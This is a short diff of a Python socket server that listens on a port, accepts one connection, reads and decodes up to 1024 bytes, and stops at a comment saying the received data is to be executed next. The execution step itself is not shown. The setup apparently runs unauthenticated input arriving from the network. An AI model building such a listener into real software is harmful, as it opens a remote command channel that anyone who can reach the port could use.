@@ -33,8 +33,8 @@ def main() -> int:
         s.bind((socket.gethostname(), PORT))
         s.listen(2)
         print("Waiting for connection...")
-        conn, pl = s.accept()
-        pl = conn.recv(1024)
+        conn, _ = s.accept()
+        pl = conn.recv(1024).decode()
         conn.close()
 
         # Now execute
